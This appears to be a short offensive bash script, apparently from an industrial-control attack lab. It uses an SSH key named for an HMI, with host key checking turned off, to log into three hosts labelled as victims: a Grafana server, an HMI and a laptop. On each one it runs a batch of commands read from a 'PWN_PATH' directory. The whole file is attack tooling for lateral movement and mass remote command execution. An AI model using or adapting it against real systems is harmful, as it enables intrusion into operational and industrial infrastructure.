#!/bin/bash
. config

ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key $VICTIM_SERVER_USER@$GRAFANA_IP < ${PWN_PATH}/commands.txt
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key $VICTIM_SERVER_USER@$HMI_IP < ${PWN_PATH}/commands.txt
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key $VICTIM_SERVER_USER@$LAPTOP_IP < ${PWN_PATH}/commands.txt
